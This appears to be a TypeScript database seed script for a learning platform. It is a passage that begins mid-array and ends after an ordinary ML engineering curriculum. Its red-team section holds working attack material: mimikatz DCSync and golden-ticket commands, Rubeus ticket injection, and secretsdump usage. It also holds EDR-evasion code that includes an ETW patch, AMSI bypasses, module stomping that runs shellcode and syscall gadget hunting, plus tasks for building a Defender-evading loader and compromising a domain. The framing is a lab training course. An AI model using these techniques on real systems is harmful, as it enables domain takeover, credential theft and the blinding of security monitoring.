\`\`\`powershell
# Rubeus captures TGT, inject it
Rubeus.exe ptt /ticket:<base64>
\`\`\`

## Completion Criteria
- [ ] Found unconstrained delegation host
- [ ] Coerced DC to authenticate
- [ ] Captured and used TGT`],

	['Forge Golden Ticket', 'Create a forged TGT for persistent domain access.', `## What You Need
- krbtgt hash (from DCSync)
- Domain SID

## Get Prerequisites
\`\`\`powershell
# DCSync for krbtgt
mimikatz # lsadump::dcsync /user:krbtgt

# Get domain SID
Get-DomainSID
\`\`\`

## Create Golden Ticket
\`\`\`powershell
mimikatz # kerberos::golden /user:Administrator /domain:lab.local \\
    /sid:S-1-5-21-xxx /krbtgt:<hash> /ptt
\`\`\`

## Result
- You ARE Domain Admin
- Valid for 10 years by default
- Works until krbtgt password changed (twice!)

## Test Access
\`\`\`powershell
dir \\\\DC01\\C$
\`\`\`

## Detection
- TGT with no corresponding AS-REQ in logs
- Ticket lifetime mismatch

## Completion Criteria
- [ ] DCSync'd krbtgt hash
- [ ] Forged golden ticket
- [ ] Accessed DC as Administrator`],

	['Execute DCSync attack', 'Replicate passwords from the domain controller.', `## What is DCSync?
Pretend to be a Domain Controller, request password replication.

## Requirements
Need "Replicating Directory Changes" rights:
- Domain Admins (by default)
- Misconfigured ACLs

## With Mimikatz
\`\`\`powershell
# Single user
lsadump::dcsync /domain:lab.local /user:Administrator

# All users
lsadump::dcsync /domain:lab.local /all /csv
\`\`\`

## With Impacket
\`\`\`bash
secretsdump.py domain/user:pass@dc -just-dc-ntlm
\`\`\`

## What You Get
- All user password hashes
- krbtgt hash (for Golden Ticket)
- Machine account hashes

## Next Steps
- Golden Ticket with krbtgt
- Pass-the-Hash with any user
- Crack hashes for passwords

## Completion Criteria
- [ ] DCSync'd all hashes
- [ ] Got krbtgt hash
- [ ] Used hashes for access`]
];

secCoreTasks.forEach(([title, desc, details], i) => {
	insertTask.run(secMod2.lastInsertRowid, title, desc, details, i, now);
});

// Month 3: Evasion & Integration
const secMod3 = insertModule.run(
	secPath.lastInsertRowid,
	'Month 3: Evasion & Integration',
	'EDR bypass and full chain operations',
	2,
	now
);

const secEvasionTasks: [string, string, string][] = [
	['Study EDR detection layers', 'Deep dive into each detection layer used by modern EDR solutions.', `## Detection Layers

### 1. User-Mode Hooks
Patches in ntdll.dll to intercept API calls.
**Bypass:** Direct syscalls, unhooking

### 2. Kernel Callbacks
OS notifies EDR of events:
- PsSetCreateProcessNotifyRoutine (processes)
- PsSetLoadImageNotifyRoutine (DLL loads)
**Bypass:** More difficult, kernel-level tricks

### 3. ETW (Event Tracing for Windows)
Telemetry from:
- .NET CLR
- PowerShell
- Syscall tracing
**Bypass:** Patch ETW functions

### 4. AMSI
Scans scripts before execution (PowerShell, VBScript, .NET)
**Bypass:** Patch AmsiScanBuffer

### 5. Memory Scanning
Periodic scans for known shellcode patterns
**Bypass:** Encoding, encryption, stomping

## Completion Criteria
- [ ] Understand each detection layer
- [ ] Know bypass technique for each`],

	['Implement indirect syscalls', 'Use gadgets in ntdll to avoid "syscall" instructions in your binary.', `## Why Indirect?
Direct syscalls put "syscall" instruction in YOUR binary → detection.
Indirect: jump to existing "syscall; ret" in ntdll.

## Steps
1. Find SSN for your function
2. Set up registers (rcx, rdx, r8, r9, stack)
3. Find "syscall; ret" gadget in ntdll
4. Jump to gadget

## Finding Gadgets
\`\`\`c
// Search ntdll for "0F 05 C3" (syscall; ret)
BYTE* ptr = (BYTE*)GetModuleHandle("ntdll");
for (size_t i = 0; i < ntdll_size; i++) {
    if (ptr[i] == 0x0F && ptr[i+1] == 0x05 && ptr[i+2] == 0xC3) {
        syscall_gadget = &ptr[i];
        break;
    }
}
\`\`\`

## Tools
- HellsGate: Dynamic SSN resolution

## Completion Criteria
- [ ] Found syscall gadget
- [ ] Implemented indirect syscall
- [ ] More evasive than direct`],

	['Implement module stomping', 'Hide shellcode in legitimate DLL memory regions.', `## The Problem
RWX memory allocations are suspicious.

## The Solution
Overwrite a signed, loaded DLL with your code.

## Steps
\`\`\`c
// 1. Load a DLL you don't need
HMODULE hMod = LoadLibrary("amsi.dll");

// 2. Find .text section
// 3. Change protection to RW
VirtualProtect(textSection, size, PAGE_READWRITE, &old);

// 4. Write shellcode
memcpy(textSection, shellcode, shellcode_size);

// 5. Change back to RX
VirtualProtect(textSection, size, PAGE_EXECUTE_READ, &old);

// 6. Execute
((void(*)())textSection)();
\`\`\`

## Result
Your code lives in "legitimate" DLL memory.
Memory scanners see signed DLL, not shellcode.

## Completion Criteria
- [ ] Implemented module stomping
- [ ] Shellcode executes from DLL region`],

	['Add sleep obfuscation', 'Encrypt beacon memory during sleep to evade scanning.', `## The Problem
Beacon sitting in memory during 60s sleep = scannable.

## The Solution
Encrypt entire beacon before sleep, decrypt after.

## Techniques
- **Ekko:** Timer-based wake
- **Foliage:** VEH-based
- **Gargoyle:** ROP-based

## Basic Approach
1. Register VEH handler
2. Encrypt beacon memory
3. Set guard page or timer
4. Sleep
5. VEH triggers on first instruction
6. Decrypt beacon
7. Continue execution

## Completion Criteria
- [ ] Beacon encrypted during sleep
- [ ] Decrypts and continues correctly
- [ ] Memory scan during sleep finds nothing`],

	['Patch ETW in loader', 'Blind ETW telemetry by patching the write function.', `## Why Patch ETW?
ETW sends telemetry to EDR. Blind it early.

## Implementation
\`\`\`c
void patch_etw() {
    void* addr = GetProcAddress(GetModuleHandle("ntdll"), "EtwEventWrite");

    DWORD old;
    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &old);

    // Patch to return immediately
    *(BYTE*)addr = 0xC3;  // ret

    VirtualProtect(addr, 1, old, &old);
}
\`\`\`

## Also Consider
- NtTraceEvent
- EtwEventWriteFull

## Do This Early
Patch before any suspicious activity.

## Completion Criteria
- [ ] ETW patched in loader
- [ ] .NET/PowerShell activity not logged`],

	['Implement AMSI bypass', 'Disable the Antimalware Scan Interface.', `## What AMSI Does
Scans scripts before execution:
- PowerShell
- VBScript
- JScript
- .NET

## Bypass 1: Patch AmsiScanBuffer
\`\`\`c
void* addr = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");

DWORD old;
VirtualProtect(addr, 6, PAGE_EXECUTE_READWRITE, &old);

// mov eax, 0x80070057; ret (return error = skip scan)
memcpy(addr, "\\xB8\\x57\\x00\\x07\\x80\\xC3", 6);
\`\`\`

## Bypass 2: Reflection (PowerShell)
\`\`\`powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
\`\`\`

## Test
After bypass, run Invoke-Mimikatz - should not be flagged.

## Completion Criteria
- [ ] AMSI bypassed
- [ ] PowerShell malware runs without detection`],

	['Study threadless injection', 'Inject code without CreateRemoteThread.', `## The Problem
CreateRemoteThread is heavily monitored.

## Alternatives

### Thread Hijacking
1. Suspend existing thread
2. Modify RIP to your code
3. Resume thread

### APC Injection
Queue APC to alertable thread.

### Callback Injection
Abuse:
- SetWindowsHookEx
- KernelCallbackTable
- Thread pool work items

## Research
- @_EthicalChaos_
- @modexpblog

## Benefit
No "new thread in remote process" telemetry.

## Completion Criteria
- [ ] Understand each technique
- [ ] Implemented one alternative
- [ ] No CreateRemoteThread in your code`],

	['Build loader that bypasses Defender', 'Combine all evasion techniques into one loader.', `## Components to Combine
1. **Encrypted payload** (AES, not XOR)
2. **Key derivation** (from environment)
3. **Indirect syscalls** (for memory ops)
4. **Module stomping** (or legitimate memory)
5. **Unhook ntdll** (restore clean copy)
6. **Patch ETW/AMSI** (blind telemetry)
7. **Environment checks** (delay in sandbox)

## Testing Process
1. Enable all Defender protections
2. Run loader
3. If detected: identify trigger
4. Modify that component
5. Repeat

## Goal
Clean execution with all protections on.

## Completion Criteria
- [ ] Loader combines all techniques
- [ ] Passes Defender real-time scan
- [ ] Payload executes successfully`],

	['Deploy Elastic Security in lab', 'Add enterprise-grade EDR to your lab.', `## Why Elastic?
Free EDR with decent detection capabilities.
Better test environment than just Defender.

## Setup Steps
1. Install Elasticsearch + Kibana
2. Install Elastic Agent on workstations
3. Enable Endpoint Security integration
4. Enable all protections (malware, memory, behavior)

## Testing
1. Run your tools against Elastic
2. Check alerts in Kibana
3. Understand what triggered detection

## Value
- Real EDR telemetry
- See what blue team sees
- Better than Defender-only testing

## Completion Criteria
- [ ] Elastic Security running
- [ ] Agent on workstations
- [ ] Alerts visible in Kibana`],

	['Enable Sysmon with SwiftOnSecurity config', 'Get detailed logging of system activity.', `## What Sysmon Logs
- Process creation with full command line
- Network connections
- File creates
- Registry changes
- Much more

## Setup
\`\`\`bash
# Download Sysmon
# Download SwiftOnSecurity config
sysmon64.exe -i sysmonconfig-export.xml
\`\`\`

## Analysis
Run your malware, then check:
- Event Viewer → Applications and Services → Microsoft → Windows → Sysmon

## Key Events
- Event ID 1: Process Create
- Event ID 3: Network Connection
- Event ID 7: Image Loaded
- Event ID 10: Process Access

## Value
See exactly what your malware generates.
This is what blue team analyzes.

## Completion Criteria
- [ ] Sysmon installed with config
- [ ] Can see malware events
- [ ] Understand detection surface`],

	['Full compromise with custom tools only', 'Complete an attack chain using only your tools.', `## The Challenge
End-to-end attack using ONLY tools you built.
No Cobalt Strike, Mimikatz, or Rubeus.

## Attack Chain
1. **Initial Access:** Phishing with your loader
2. **Establish C2:** Your beacon
3. **Enumeration:** Your scripts
4. **Credential Dump:** Your dumper
5. **Lateral Movement:** PtH with your tools
6. **Domain Admin:** DCSync, Golden Ticket

## Goals
- Full compromise of lab
- All custom code
- Understand every step

## Document
- What worked
- What was detected
- What needs improvement

## Completion Criteria
- [ ] Compromised domain with custom tools
- [ ] No third-party offensive tools
- [ ] Documented the full chain`],

	['Review logs and document detections', 'Analyze what your attack generated in logs.', `## Review Checklist

### Elastic Security Alerts
- What triggered?
- Why was it flagged?
- What rule matched?

### Sysmon Logs
- Process creation events
- Network connections
- File operations

### Windows Security Log
- Authentication events
- Privilege usage
- Object access

## Document Format
\`\`\`markdown
## Detection: Memory Scan Alert
- Trigger: Shellcode pattern in process memory
- Tool: Loader
- Bypass: Add more encoding, use stomping
\`\`\`

## Completion Criteria
- [ ] Reviewed all log sources
- [ ] Documented each detection
- [ ] Have improvement roadmap`],

	['Implement detection bypasses', 'Fix each detection you found in logs.', `## Process
For each detection:
1. Identify what triggered it
2. Research bypass technique
3. Modify your tool
4. Test again
5. Repeat until clean

## Common Bypasses
- **Memory scan:** More encoding, stomping
- **Network:** Change C2 profile, add jitter
- **Process creation:** Different parent, clean cmdline
- **API calls:** Indirect syscalls, unhooking

## Iteration
\`\`\`
modify → test → check logs → modify → test...
\`\`\`

## Goal
Clean attack chain with zero alerts.

## Completion Criteria
- [ ] Each detection has bypass
- [ ] Tools updated with bypasses
- [ ] Clean run in Elastic Security`]
];

secEvasionTasks.forEach(([title, desc, details], i) => {
	insertTask.run(secMod3.lastInsertRowid, title, desc, details, i, now);
});

// ============================================================================
// ML Pipeline Path (from ml-pipeline-complete-guide.md concepts)
// ============================================================================
const mlOpsPath = insertPath.run(
	'ML Engineering & Ops',
	'Build production ML pipelines, from data processing to model serving. Covers the full lifecycle of ML systems.',
	'blue',
	now
);

const mlOpsMod1 = insertModule.run(
	mlOpsPath.lastInsertRowid,
	'Data Engineering',
	'Data pipelines and feature engineering',
	0,
	now
);

const dataTasks: [string, string, string][] = [
	['Set up feature store template', 'Build a centralized repository for ML features with versioning.', `## What is a Feature Store?
Centralized repository for ML features that ensures consistency between training and serving.

## Interface Design
\`\`\`python
class FeatureStore:
    def write_features(self, entity_id, features_dict, timestamp):
        """Store features for an entity at a point in time."""
        pass

    def get_features(self, entity_id, feature_names, point_in_time=None):
        """Retrieve features, optionally as of a specific time."""
        pass

    def list_features(self):
        """List all available features."""
        pass
\`\`\`

## Storage Options
- **SQLite:** Simple, good for prototypes
- **Redis:** Real-time serving
- **Feast:** Production-ready, open source

## Key Concept: Point-in-Time Correctness
Never leak future data into training!
Always retrieve features as they were at prediction time.

## Completion Criteria
- [ ] Built feature store interface
- [ ] Supports versioning/timestamps
- [ ] Can retrieve historical features`],

	['Implement ETL pipeline base class', 'Create a reusable pipeline structure for data processing.', `## Base Class Design
\`\`\`python
from abc import ABC, abstractmethod

class Pipeline(ABC):
    @abstractmethod
    def extract(self) -> Any:
        """Pull data from source."""
        pass

    @abstractmethod
    def transform(self, raw_data: Any) -> Any:
        """Process and clean data."""
        pass

    @abstractmethod
    def load(self, processed_data: Any) -> None:
        """Write to destination."""
        pass

    def run(self):
        raw = self.extract()
        processed = self.transform(raw)
        self.load(processed)
\`\`\`

## Features to Add
- **Logging:** Track each step
- **Error handling:** Retry with backoff
- **Idempotency:** Safe to re-run
- **Checkpointing:** Resume from failure

## Scheduling
- Airflow for complex DAGs
- Simple cron for basic pipelines

## Completion Criteria
- [ ] Base class with extract/transform/load
- [ ] Implemented for one data source
- [ ] Pipeline can restart without duplicating`],

	['Create data validation pipeline', 'Add validation checks before training to catch bad data.', `## Validation Layers

### 1. Schema Validation
\`\`\`python
def validate_schema(df):
    assert 'user_id' in df.columns
    assert df['user_id'].dtype == 'int64'
    assert df['amount'].notna().all()
\`\`\`

### 2. Statistical Checks
\`\`\`python
def validate_stats(df):
    assert df['amount'].min() >= 0
    assert df['amount'].max() < 1_000_000
    assert df['amount'].isna().mean() < 0.05  # <5% null
\`\`\`

### 3. Data Drift Detection
\`\`\`python
from scipy import stats

def detect_drift(current, baseline):
    ks_stat, p_value = stats.ks_2samp(current, baseline)
    if p_value < 0.01:
        raise ValueError(f"Data drift detected! KS stat: {ks_stat}")
\`\`\`

## Libraries
- **Great Expectations:** Full-featured validation
- **Pandera:** DataFrame schema validation

## Integration
Fail pipeline early if validation fails.
Log all statistics for monitoring.

## Completion Criteria
- [ ] Schema validation implemented
- [ ] Statistical checks in place
- [ ] Drift detection working`],

	['Build streaming data processor', 'Create real-time feature updates for online serving.', `## Architecture Options
| Option | Complexity | Latency |
|--------|------------|---------|
| Kafka + Flink | High | Very Low |
| Redis Streams | Medium | Low |
| Python asyncio | Low | Medium |

## Pattern
\`\`\`
Event → Compute Features → Update Store → (Optional) Trigger Model
\`\`\`

## Simple Implementation
\`\`\`python
import asyncio
import redis.asyncio as redis

async def process_events():
    r = await redis.from_url("redis://localhost")
    pubsub = r.pubsub()
    await pubsub.subscribe("events")

    async for message in pubsub.listen():
        if message["type"] == "message":
            event = json.loads(message["data"])
            features = compute_features(event)
            await store.write_features(event["user_id"], features)
\`\`\`

## Handle Edge Cases
- Late arrivals
- Out-of-order events
- Exactly-once processing

## Completion Criteria
- [ ] Streaming processor running
- [ ] Features update in real-time
- [ ] Handles edge cases`],

	['Implement data versioning', 'Version datasets like code for reproducibility.', `## DVC (Data Version Control)
\`\`\`bash
# Initialize
dvc init

# Track data file
dvc add data/train.csv

# Commit metadata to git
git add data/train.csv.dvc .gitignore
git commit -m "Add training data v1"

# Push data to remote storage
dvc push  # to S3, GCS, etc.
\`\`\`

## Benefits
- Reproduce any experiment
- Share large datasets
- Track data alongside code

## Alternatives
- **Delta Lake:** Time travel for parquet
- **Timestamps:** Simple but manual

## Usage
\`\`\`bash
# Checkout old version
git checkout v1.0
dvc checkout

# Now you have the exact data from v1.0
\`\`\`

## Test
Can you restore the dataset from 3 months ago?

## Completion Criteria
- [ ] DVC set up with remote
- [ ] Data versioned with commits
- [ ] Can restore any version`]
];

dataTasks.forEach(([title, desc, details], i) => {
	insertTask.run(mlOpsMod1.lastInsertRowid, title, desc, details, i, now);
});

const mlOpsMod2 = insertModule.run(
	mlOpsPath.lastInsertRowid,
	'Model Training',
	'Training pipelines and experiment tracking',
	1,
	now
);

const trainingOpsTasks: [string, string, string][] = [
	['Set up MLflow tracking', 'Configure experiment tracking with MLflow.', `## Setup
\`\`\`bash
pip install mlflow
mlflow server --backend-store-uri sqlite:///mlflow.db
\`\`\`

## Usage
\`\`\`python
import mlflow

mlflow.set_experiment("my-experiment")

with mlflow.start_run():
    # Log parameters
    mlflow.log_params({"lr": 0.01, "epochs": 100})

    # Log metrics over time
    for epoch in range(100):
        mlflow.log_metrics({"loss": loss, "accuracy": acc}, step=epoch)

    # Log model
    mlflow.sklearn.log_model(model, "model")
\`\`\`

## Model Registry
Promote models through stages:
\`\`\`
None → Staging → Production → Archived
\`\`\`

## UI
http://localhost:5000 shows all experiments, runs, and metrics.

## Completion Criteria
- [ ] MLflow server running
- [ ] Experiments tracked
- [ ] Models logged to registry`],

	['Implement hyperparameter tuning', 'Use Optuna for efficient hyperparameter search.', `## Why Optuna?
3-10x more efficient than grid search.
Uses Bayesian optimization to focus on promising regions.

## Basic Usage
\`\`\`python
import optuna

def objective(trial):
    # Suggest hyperparameters
    lr = trial.suggest_float("lr", 1e-5, 1e-2, log=True)
    n_layers = trial.suggest_int("n_layers", 1, 5)
    dropout = trial.suggest_float("dropout", 0.1, 0.5)

    # Train and evaluate
    model = train(lr=lr, n_layers=n_layers, dropout=dropout)
    return val_loss

study = optuna.create_study(direction="minimize")
study.optimize(objective, n_trials=100)

print(f"Best params: {study.best_params}")
\`\`\`

## Features
- **Pruning:** Stop bad trials early
- **Visualization:** Plot optimization history
- **Parallel:** Run trials concurrently

## Integration with MLflow
\`\`\`python
mlflow.log_params(study.best_params)
\`\`\`

## Completion Criteria
- [ ] Optuna study running
- [ ] Found better params than default
- [ ] Logged best params to MLflow`],

	['Build cross-validation pipeline', 'Implement proper CV for reliable evaluation.', `## For Tabular Data
\`\`\`python
from sklearn.model_selection import StratifiedKFold

kfold = StratifiedKFold(n_splits=5, shuffle=True, random_state=42)

scores = []
for fold, (train_idx, val_idx) in enumerate(kfold.split(X, y)):
    X_train, X_val = X[train_idx], X[val_idx]
    y_train, y_val = y[train_idx], y[val_idx]

    model.fit(X_train, y_train)
    score = model.score(X_val, y_val)
    scores.append(score)

    mlflow.log_metric(f"fold_{fold}_score", score)

print(f"Mean: {np.mean(scores):.3f} ± {np.std(scores):.3f}")
\`\`\`

## For Time Series
\`\`\`python
from sklearn.model_selection import TimeSeriesSplit

tscv = TimeSeriesSplit(n_splits=5)
# DON'T shuffle! Order matters.
\`\`\`

## Nested CV (Proper Hyperparameter Tuning)
- Outer loop: Evaluate model
- Inner loop: Tune hyperparameters
- Prevents overfitting to validation set

## Completion Criteria
- [ ] CV pipeline implemented
- [ ] Reports mean ± std
- [ ] Each fold logged to MLflow`],

	['Create model comparison framework', 'Fairly compare multiple models with the same data.', `## Fair Comparison Requirements
- Same data splits
- Same metrics
- Same compute budget

## Comparison Table
\`\`\`markdown
| Model | Train Time | Val Loss | Test Loss | Inference | Size |
|-------|------------|----------|-----------|-----------|------|
| XGBoost | 30s | 0.12 | 0.13 | 1ms | 5MB |
| LightGBM | 20s | 0.11 | 0.12 | 1ms | 4MB |
| Neural Net | 5min | 0.10 | 0.14 | 5ms | 50MB |
\`\`\`

## Statistical Significance
\`\`\`python
from scipy.stats import ttest_rel

# Compare across folds
t_stat, p_value = ttest_rel(model_a_scores, model_b_scores)
if p_value < 0.05:
    print("Difference is statistically significant")
\`\`\`

## Dashboard
Build with Streamlit or Grafana showing:
- Current production model
- Challenger models
- Metric trends

## Completion Criteria
- [ ] Comparison table generated
- [ ] Statistical tests applied
- [ ] Dashboard showing results`],

	['Implement distributed training', 'Scale training across multiple GPUs.', `## PyTorch DDP Setup

### Launch Command
\`\`\`bash
torchrun --nproc_per_node=2 train.py
\`\`\`

### Code Changes
\`\`\`python
import torch.distributed as dist
from torch.nn.parallel import DistributedDataParallel as DDP
from torch.utils.data.distributed import DistributedSampler

# Initialize
dist.init_process_group("nccl")
local_rank = int(os.environ["LOCAL_RANK"])
torch.cuda.set_device(local_rank)

# Wrap model
model = model.to(local_rank)
model = DDP(model, device_ids=[local_rank])

# Use distributed sampler
sampler = DistributedSampler(dataset)
loader = DataLoader(dataset, sampler=sampler)

# Don't forget!
sampler.set_epoch(epoch)
\`\`\`

## Multi-Node
\`\`\`bash
# On each node
MASTER_ADDR=node0 MASTER_PORT=29500 torchrun ...
\`\`\`

## Monitoring
GPU utilization should be >80%.
If lower, check:
- Data loading bottleneck
- Unbalanced batches
- Communication overhead

## Completion Criteria
- [ ] DDP training working
- [ ] Scales to 2+ GPUs
- [ ] GPU utilization >80%`]
];

trainingOpsTasks.forEach(([title, desc, details], i) => {
	insertTask.run(mlOpsMod2.lastInsertRowid, title, desc, details, i, now);
});

const mlOpsMod3 = insertModule.run(
	mlOpsPath.lastInsertRowid,
	'Model Serving',
	'Deploy and serve models in production',
	2,
	now
);

const servingTasks: [string, string, string][] = [
	['Build FastAPI inference server', 'Create a REST API for model inference.', `## Basic Server
\`\`\`python
from fastapi import FastAPI
from pydantic import BaseModel

app = FastAPI()

# Load model once at startup
model = load_model("model.pkl")

class PredictRequest(BaseModel):
    features: list[float]

class PredictResponse(BaseModel):
    prediction: float
    confidence: float

@app.post("/predict", response_model=PredictResponse)
async def predict(request: PredictRequest):
    pred = model.predict([request.features])[0]
    return PredictResponse(prediction=pred, confidence=0.95)

@app.get("/health")
async def health():
    return {"status": "healthy"}
\`\`\`

## Deployment
\`\`\`bash
# Development
uvicorn server:app --reload

# Production
gunicorn server:app -w 4 -k uvicorn.workers.UvicornWorker
\`\`\`

## Features
- Request validation with Pydantic
- Async for I/O-bound operations
- Auto-generated OpenAPI docs at /docs

## Completion Criteria
- [ ] Server running with /predict
- [ ] Health check endpoint
- [ ] Deployed with Docker`],

	['Implement model versioning', 'Support multiple model versions with gradual rollout.', `## Strategies

### Blue-Green Deployment
\`\`\`
v1 (100%) ─────────────────────────────
               v2 deployed, tested
v1 (0%)  ──┐
v2 (100%) ─┴───────────────────────────
\`\`\`

### Canary Deployment
\`\`\`
v1 (100%) → v1 (90%) → v1 (50%) → v1 (0%)
v2 (0%)   → v2 (10%) → v2 (50%) → v2 (100%)
\`\`\`

## Implementation
\`\`\`python
@app.post("/predict")
async def predict(request: PredictRequest, version: str = "v1"):
    model = models[version]
    return model.predict(request.features)
\`\`\`

## A/B Testing
\`\`\`python
import random

def get_model_version(user_id):
    if hash(user_id) % 100 < 10:  # 10% to v2
        return "v2"
    return "v1"
\`\`\`

## Tracking
Log which version served each request for analysis.

## Completion Criteria
- [ ] Multiple versions deployed
- [ ] Traffic splitting implemented
- [ ] Can rollback instantly`],

	['Add monitoring and alerting', 'Detect data drift and model degradation.', `## Types of Drift

### Input Drift
Feature distributions changing.
\`\`\`python
from evidently.metrics import DataDriftPreset
from evidently.report import Report

report = Report(metrics=[DataDriftPreset()])
report.run(reference_data=train_data, current_data=today_data)
\`\`\`

### Prediction Drift
Model outputs changing.

### Concept Drift
Relationship between X and Y changing (need ground truth).

## Dashboard Setup
\`\`\`yaml
# prometheus.yml
scrape_configs:
  - job_name: 'ml-server'
    static_configs:
      - targets: ['localhost:8000']
\`\`\`

## Alerting
\`\`\`python
if drift_score > threshold:
    send_slack_alert(f"Data drift detected! Score: {drift_score}")
\`\`\`

## Metrics to Track
- Request latency (p50, p95, p99)
- Error rate
- Feature distributions
- Prediction distributions

## Completion Criteria
- [ ] Drift detection running
- [ ] Prometheus metrics exposed
- [ ] Alerts configured`],

	['Create load testing suite', 'Test API performance under load.', `## Locust Setup
\`\`\`python
from locust import HttpUser, task, between

class PredictUser(HttpUser):
    wait_time = between(0.1, 0.5)

    @task
    def predict(self):
        self.client.post("/predict", json={
            "features": [1.0, 2.0, 3.0]
        })
\`\`\`

## Run Tests
\`\`\`bash
locust -f loadtest.py --host http://localhost:8000
\`\`\`

## Metrics to Measure
- Requests per second (throughput)
- p50, p95, p99 latency
- Error rate
- Concurrent users at saturation

## Test Scenarios
1. **Normal load:** Expected traffic
2. **Burst:** Sudden spike
3. **Sustained:** High load over time

## Finding Breaking Point
Increase users until:
- Latency spikes
- Errors increase
- Server becomes unresponsive

## Optimization Ideas
- Request batching
- Response caching
- Model quantization

## Completion Criteria
- [ ] Load tests running
- [ ] Know breaking point
- [ ] Have optimization plan`],

	['Implement graceful degradation', 'Handle model failures without complete outage.', `## Fallback Strategies

### 1. Return Cached Prediction
\`\`\`python
cache = {}

def predict_with_cache(features):
    key = hash(tuple(features))
    try:
        result = model.predict(features)
        cache[key] = result
        return result
    except:
        return cache.get(key, default_prediction)
\`\`\`

### 2. Fallback to Simpler Model
\`\`\`python
def predict(features):
    try:
        return complex_model.predict(features)
    except:
        return simple_rules_model.predict(features)
\`\`\`

### 3. Return Safe Default
\`\`\`python
def predict(features):
    try:
        return model.predict(features)
    except:
        return {"prediction": 0, "confidence": 0}
\`\`\`

## Circuit Breaker Pattern
\`\`\`python
from circuitbreaker import circuit

@circuit(failure_threshold=5, recovery_timeout=30)
def predict(features):
    return model.predict(features)
\`\`\`

If 5 failures occur, circuit opens and returns fallback for 30 seconds.

## Timeouts
\`\`\`python
@app.post("/predict")
async def predict(request: PredictRequest):
    try:
        result = await asyncio.wait_for(
            model.predict_async(request.features),
            timeout=1.0
        )
    except asyncio.TimeoutError:
        return fallback_response
\`\`\`

## Testing
Kill model process, verify graceful handling.

## Completion Criteria
- [ ] Fallback strategies implemented
- [ ] Circuit breaker in place
- [ ] Tested failure scenarios`]
];

servingTasks.forEach(([title, desc, details], i) => {
	insertTask.run(mlOpsMod3.lastInsertRowid, title, desc, details, i, now);
});

console.log('Database seeded successfully!');
console.log('Created 3 learning paths:');
console.log('  - AI/ML Deep Learning (6 modules, includes Math Foundations)');
console.log('  - Red Team & Offensive Security (3 modules)');
console.log('  - ML Engineering & Ops (3 modules)');

db.close();
